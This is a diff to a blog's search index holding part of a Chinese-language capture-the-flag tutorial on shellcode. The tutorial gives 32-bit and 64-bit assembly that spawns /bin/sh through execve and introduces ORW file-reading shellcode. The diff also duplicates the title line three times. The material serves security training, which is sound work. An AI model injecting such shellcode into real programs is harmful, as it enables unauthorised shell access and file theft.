@@ -277,6 +277,9 @@ shellcode变型这是最后一种类型的shellcode，和mrctf2020_shellcode类�
     <title>01 shellcode</title>
     <url>/2025/07/24/01%20ShellCode/</url>
     <content><![CDATA[
+title: 01 shellcode
+title: 01 shellcode
+title: 01 shellcode
 title: 01 shellcode什么是shellcodeshellcode通常是软件漏洞利用过程中使用的一小段机器代码
 作用：
 1、启动shell进行交互
@@ -287,8 +290,8 @@ shellcode编写我们在linux系统写编写一个最简短的c语言程序：
 //gcc -m32 -o shell shell.c#include&lt;stdlib.h&gt;#include&lt;unistd.h&gt;void main()&#123;    system(&quot;/bin/sh&quot;);    exit(0);&#125;
 
 很显然，这样做出来的程序太大了，在题目中我们一般只能输入几十个字节，其次他直接使用了系统函数，但是我们都不知道系统函数是啥（被包装成sytem@plt了）：
-![image_0](img&#x2F;01 shellcode&#x2F;01 shellcode0x00.png)
-![image_1](img&#x2F;01 shellcode&#x2F;01 shellcode0x01.png)
+
+
 我们可以通过中断的方法进行系统调用。
 系统中断方法调用shellcode触发中断（int 0x80或者syscall），进行系统调用
 system(“&#x2F;bin&#x2F;sh”)底层调用的是execve(“&#x2F;bin&#x2F;sh”,0,0)
@@ -368,7 +371,7 @@ const char* const envp[]
 ;;nasm -f elf32 shellcode32.asm;;ld -m elf_i386 -o shellcode32 shellcode32.o;;objdump -d shellcode32global _start_start:    push &quot;/sh&quot;    push &quot;/bin&quot;    mov ebx, esp    xor ecx, ecx    xor edx, edx    mov eax, 0x0b    int 0x80
 
 现在，我们得到一个非常小的shellcode，并且也没有使用系统函数。
-![image_2](img&#x2F;01 shellcode&#x2F;01 shellcode0x02.png)![image_3](img&#x2F;01 shellcode&#x2F;01 shellcode0x03.png)
+
 因为是i386，也就是32位的程序，很显然我们可以看到这里对应32位的syscall各自的参数是如表格所示的。
 64位shellcode如此这般，我们可以构造一个64位的shellcode：
 ;;nasm -f elf64 shellcode64.asm;;ld -m elf_x86_64 -o shellcode64 shellcode64.o;;objdump -d shellcode64global _start_start:    mov rbx, &#x27;/bin/sh&#x27;     ; 把字符串&quot;/bin/sh&quot;的地址放到rbx寄存器    push rbx               ; 将&quot;/bin/sh&quot;的地址压入栈    push rsp               ; 把当前栈顶指针（指向&quot;/bin/sh&quot;地址）压入栈    pop rdi                ; 从栈弹出数据到rdi，使rdi指向&quot;/bin/sh&quot;    xor rsi, rsi           ; 清空rsi（argv参数设为0）    xor rdx, rdx           ; 清空rdx（envp参数设为0）    push 0x3b              ; 把系统调用号0x3b压入栈    pop rax                ; 从栈弹出数据到rax，设置系统调用号    syscall                ; 执行系统调用
@@ -425,7 +428,7 @@ plain mov ebx, 0x6e69622f    ; 存储 &quot;/bin&quot; push rbx               ; 
 ORW有一种比较特殊的shellcode，就是这样的：shellcode1_dahuan02
 这道题目是ORW，所谓ORW就是Open、Read、Write。
 因为几乎所有的程序都需要打开文件，读取数据和输出。而有些题目会封锁systemcall里面的sys_execve。按照这个逻辑，我们可以通过ORW来读取所有我们需要的文件，如下：
-![image_4](img&#x2F;01 shellcode&#x2F;01 shellcode0x04.png)
+
 这是一个非常基本的64位流程图，因为这些题目都会有一个特性：执行用户输入进去的内容。
 然后在这里我们详细讲一下ORW的残割参数和里面是如何传递输出的。
 首先我们先要学习一下这三个函数：
